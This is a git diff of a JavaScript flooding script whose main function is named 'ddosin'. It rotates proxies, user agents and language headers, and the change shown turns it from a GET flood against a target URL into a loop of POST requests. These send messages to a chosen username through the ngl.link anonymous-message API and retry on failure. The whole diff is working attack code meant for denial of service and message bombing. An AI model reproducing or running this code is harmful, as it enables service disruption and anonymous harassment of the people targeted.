@@ -4,7 +4,7 @@ const SocksProxyAgent = require('socks-proxy-agent');
 const HttpsProxyAgent = require('https-proxy-agent');
 const randomUseragent = require('random-useragent');
 
-function ddosin(targetUrl, durasi){
+function ddosin(targetUrl, chatnya){
 
  const langHeader = [
 "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
@@ -388,12 +388,20 @@ const headers = {
  'TE': 'Trailers',
 };
 
-axios.get(target, { httpAgent: agent, headers: headers })
+const requestData = `username=${target}&question=${chatnya}&deviceId=&gameSlug=&referrer=`
+
+axios.post('https://ngl.link/api/submit', requestData, { httpAgent: agent, headers: headers })
 .then(response => {
+    if (response.status === 200) {
+        console.log('Request berhasil:', response.data);
+    } else {
+        console.log('Request gagal dengan status:', response.status);
+    }
 })
 .catch(error => {
-sendRequest(target, agent);
+  sendRequest(target, agent);
 });
+
 }
 
 function sendRequests() {
